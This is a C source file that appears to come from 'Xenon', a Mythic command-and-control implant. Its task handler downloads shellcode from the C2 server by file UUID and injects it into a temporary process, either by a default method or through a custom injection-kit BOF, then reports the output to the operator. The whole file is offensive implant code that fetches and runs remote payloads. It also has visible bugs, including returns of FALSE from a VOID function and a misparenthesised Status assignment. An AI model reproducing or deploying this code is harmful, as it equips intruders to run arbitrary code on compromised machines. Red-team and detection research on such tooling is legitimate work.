#include "Tasks/InjectShellcode.h"

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Mythic.h"
#include "Inject.h"
#include "BeaconCompatibility.h"
#include "Tasks/InlineExecute.h"

/**
 * @brief Inject shellcode into temporary process and return output
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    DWORD  Status;
    BOOL   isProcessInjectKit   = FALSE;
    MYTHIC_FILE Shellcode       = { 0 };
    PCHAR  injectKitBof         = NULL;
    SIZE_T uuidLen              = 0;
    SIZE_T kitLen               = 0;
    PCHAR  Output               = NULL;

    /* Parse command arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    if (nbArg > 1) {
        isProcessInjectKit = TRUE;
    }

    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);
    if (isProcessInjectKit) {
        injectKitBof = ParserGetString(arguments, &kitLen);
        injectKitBof += 8;                                                  // bc of the way translation container is packing it
        kitLen       -= 8;
        _dbg("[+] Using Custom Process Injection Kit. %d bytes", kitLen);
    }

    strncpy(Shellcode.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
    Shellcode.fileUuid[TASK_UUID_SIZE + 1] = '\0';

    _dbg("Fetching Mythic file - %s", Shellcode.fileUuid);

    /* Fetch file from Mythic using File UUID */
    if (Status = MythicGetFileBytes(taskUuid, &Shellcode) != 0)
    {
        _err("Failed to fetch file from Mythic server.");
        PackageError(taskUuid, Status);
        return;
    }

    /* Inject shellcode ( default | custom kit )*/
    if (isProcessInjectKit) {
        if (!InjectCustomKit((PBYTE)Shellcode.buffer, Shellcode.size, injectKitBof, kitLen, &Output)) {
            DWORD error = GetLastError();
            _err("[!] Failed to inject with kit. ERROR : %d\n", error);
            PackageError(taskUuid, error);
            return FALSE;
        }
    } else {
        if (!InjectDefault((PBYTE)Shellcode.buffer, Shellcode.size, &Output)) {
            DWORD error = GetLastError();
            _err("[!] Failed to inject with default method. ERROR : %d\n", error);
            PackageError(taskUuid, error);
            return FALSE;
        }
    }

    _dbg("[+] Done injecting.");

    // Output
    PPackage data = PackageInit(0, FALSE);

    if (Output != NULL) {
        PackageAddString(data, Output, FALSE);
    }

    // Success
    PackageComplete(taskUuid, data);

END:
    // Cleanup
    free(Output);
    LocalFree(Shellcode.buffer);                // Allocated in MythicGetFileBytes()
    Shellcode.buffer = NULL;
    if (data) PackageDestroy(data);
}